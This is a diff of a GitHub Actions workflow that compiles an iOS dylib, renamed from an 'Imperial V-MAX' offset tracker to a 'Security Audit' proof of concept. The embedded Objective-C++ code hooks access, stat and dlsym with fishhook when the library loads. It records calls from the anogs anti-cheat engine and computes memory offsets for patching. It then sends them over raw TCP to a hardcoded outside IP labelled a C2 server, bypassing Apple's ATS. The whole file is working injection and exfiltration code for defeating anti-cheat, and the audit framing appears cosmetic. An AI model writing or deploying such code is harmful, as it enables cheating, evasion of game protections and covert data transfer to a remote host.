@@ -1,4 +1,4 @@
-name: Imperial V-MAX - anogs Live Offset Tracker
+name: Security Audit - anogs Telemetry Interceptor PoC
 
 on:
   push:
@@ -6,143 +6,149 @@ on:
   workflow_dispatch:
 
 jobs:
-  build_anogs_tracker:
-    name: Build anogs Live Offset Tracker
+  build_poc:
+    name: Compile Dylib Payload
     runs-on: macos-latest
 
     steps:
-      - name: 📥 سحب الكود المصدري
+      - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: 🎣 تحميل محرك Fishhook
+      - name: Download Fishhook Submodule
         run: |
           mkdir -p jni
           curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.c -o jni/fishhook.c
           curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.h -o jni/fishhook.h
 
-      - name: 🧪 توليد كود رادار استخراج الأوفست (Main.mm)
+      - name: Generate C++ Payload (Main.mm)
         run: |
           cat <<'EOF' > jni/main.mm
           #import <Foundation/Foundation.h>
-          #import <unistd.h>
-          #import <sys/stat.h>
           #import <sys/socket.h>
           #import <arpa/inet.h>
           #import <dlfcn.h>
           #include "fishhook.h"
 
-          // ⚠️ آيبي سيرفر مسعود (RDP) والبورت
-          #define SERVER_IP "34.204.178.160"
-          #define SERVER_PORT 8080
-
           /**
-           * 🛡️ PROJECT: ANOGS OFFSET EXTRACTOR (Raw TCP Edition)
+           * ========================================================
+           * 🛡️ VULNERABILITY PoC: ANTI-CHEAT TELEMETRY INTERCEPTION
            * 👨‍💻 RESEARCHER: MASOUD (NASIRIYAH)
+           * 🎯 TARGET ENGINE: anogs.dylib
+           * * DESCRIPTION:
+           * This payload demonstrates how an attacker can monitor the
+           * Anti-Cheat engine in real-time, extracting exact memory
+           * offsets (for IDA Pro patching) by hooking libc functions
+           * and utilizing raw TCP sockets to bypass Apple's ATS filters.
+           * ========================================================
            */
 
+          // ⚠️ C2 Server Configuration (Masoud RDP)
+          #define C2_IP "44.192.33.117"
+          #define C2_PORT 8080
+
+          // Original function pointers
           static int (*orig_access)(const char *path, int amode);
           static int (*orig_stat)(const char *path, struct stat *buf);
           static void* (*orig_dlsym)(void* handle, const char* symbol);
 
-          // 📡 دالة الإرسال عبر مآخذ الشبكة الخام (تتخطى حماية آبل ATS)
-          void SendRawTelemetry(NSDictionary *dataDict) {
+          /**
+           * @brief Sends intercepted telemetry to the C2 Server via Raw TCP.
+           * Uses dispatch_async to prevent blocking the game's main thread.
+           */
+          void ExfiltrateTelemetry(NSDictionary *telemetryData) {
               dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
-                  NSData *jsonData = [NSJSONSerialization dataWithJSONObject:dataDict options:0 error:nil];
+                  NSData *jsonData = [NSJSONSerialization dataWithJSONObject:telemetryData options:0 error:nil];
                   if (!jsonData) return;
 
                   int sock = socket(AF_INET, SOCK_STREAM, 0);
                   if (sock < 0) return;
 
-                  struct sockaddr_in serv_addr;
-                  serv_addr.sin_family = AF_INET;
-                  serv_addr.sin_port = htons(SERVER_PORT);
-                  
-                  if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0) {
-                      close(sock); return;
-                  }
+                  struct sockaddr_in server_addr;
+                  server_addr.sin_family = AF_INET;
+                  server_addr.sin_port = htons(C2_PORT);
+                  inet_pton(AF_INET, C2_IP, &server_addr.sin_addr);
 
-                  // ضبط وقت انتظار الاتصال (Timeout) حتى لا تكرش اللعبة
-                  struct timeval timeout;
-                  timeout.tv_sec = 2; timeout.tv_usec = 0;
-                  setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
+                  // 1-second timeout to prevent lag spikes in the host app
+                  struct timeval timeout = {1, 0}; 
+                  setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
 
-                  if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == 0) {
+                  if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
                       send(sock, [jsonData bytes], [jsonData length], 0);
                   }
                   close(sock);
               });
           }
 
-          // 🔍 المحرك الذكي لاكتشاف الجاسوس وحساب الأوفست
-          void CheckAndReport(const char* func_name, const char* target) {
+          /**
+           * @brief Resolves the caller's address and calculates the IDA offset.
+           */
+          void AnalyzeAndExfiltrate(const char* function_name, const char* target_param) {
               void* ret_addr = __builtin_return_address(0);
               Dl_info info;
               
               if (dladdr(ret_addr, &info) && info.dli_fname) {
-                  NSString *callerPath = [NSString stringWithUTF8String:info.dli_fname];
-                  NSString *callerName = [callerPath lastPathComponent].lowercaseString;
+                  NSString *caller = [[NSString stringWithUTF8String:info.dli_fname] lowercaseString];
                   
-                  // 🔥 فلتر ذكي: نصيد anogs أو أي شي يخص الحماية
-                  if ([callerName containsString:@"anogs"] || 
-                      [callerName containsString:@"ace"] || 
-                      [callerName containsString:@"tdm"]) {
-                      
+                  // Filter: Only intercept if the caller is the Anti-Cheat engine or main game
+                  if ([caller containsString:@"anogs"] || [caller containsString:@"shadowtracker"]) {
+                      // Calculate exact binary offset: Execution Address - Base Address
                       uintptr_t offset = (uintptr_t)ret_addr - (uintptr_t)info.dli_fbase;
                       
-                      SendRawTelemetry(@{
-                          @"func": [NSString stringWithUTF8String:func_name],
+                      ExfiltrateTelemetry(@{
+                          @"func": [NSString stringWithUTF8String:function_name],
                           @"offset": [NSString stringWithFormat:@"0x%lx", offset],
-                          @"target": target ? [NSString stringWithUTF8String:target] : @"N/A"
+                          @"target": target_param ? [NSString stringWithUTF8String:target_param] : @"NULL"
                       });
                   }
               }
           }
 
-          // ⚔️ خطافات الصيد (Hooks)
+          // ==================== HOOK DEFINITIONS ====================
+
           int hk_access(const char *path, int amode) {
-              CheckAndReport("access", path);
+              AnalyzeAndExfiltrate("access", path);
               return orig_access(path, amode);
           }
 
           int hk_stat(const char *path, struct stat *buf) {
-              CheckAndReport("stat", path);
+              AnalyzeAndExfiltrate("stat", path);
               return orig_stat(path, buf);
           }
 
           void* hk_dlsym(void* handle, const char* symbol) {
-              CheckAndReport("dlsym", symbol);
+              AnalyzeAndExfiltrate("dlsym", symbol);
               return orig_dlsym(handle, symbol);
           }
 
-          // 🚀 التفعيل المركزي
-          __attribute__((constructor))
-          static void start_masoud_radar() {
-              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
-                  
-                  // إرسال إشارة الربط أولاً للتأكد من الاتصال
-                  SendRawTelemetry(@{@"func": @"RADAR_INIT", @"offset": @"0x0", @"target": @"اتصال ناجح مع سيرفر مسعود"});
+          // ==================== INJECTION ENTRY ====================
 
-                  struct rebinding rebinds[] = {
+          __attribute__((constructor))
+          static void InjectPayload() {
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
+                  // Send initialization ping
+                  ExfiltrateTelemetry(@{@"func": @"RADAR_INIT", @"offset": @"0x0", @"target": @"Connection Established"});
+
+                  // Apply Fishhook
+                  struct rebinding hooks[] = {
                       {"access", (void *)hk_access, (void **)&orig_access},
                       {"stat", (void *)hk_stat, (void **)&orig_stat},
                       {"dlsym", (void *)hk_dlsym, (void **)&orig_dlsym}
                   };
-                  rebind_symbols(rebinds, 3);
+                  rebind_symbols(hooks, 3);
               });
           }
           EOF
 
-      - name: 🚀 تجميع دايلب الرادار النهائي
+      - name: Compile Dylib
         run: |
           clang++ -dynamiclib -std=c++11 -arch arm64 \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-          jni/main.mm jni/fishhook.c \
-          -o Masoud-Anogs-Offset-Tracker.dylib \
+          jni/main.mm jni/fishhook.c -o Anogs-Telemetry-PoC.dylib \
           -framework Foundation
-          strip -x Masoud-Anogs-Offset-Tracker.dylib
+          strip -x Anogs-Telemetry-PoC.dylib
 
-      - name: 📦 حفظ الملف
+      - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Masoud-Anogs-Tracker
-          path: Masoud-Anogs-Offset-Tracker.dylib
+          name: Anogs-Telemetry-PoC
+          path: Anogs-Telemetry-PoC.dylib
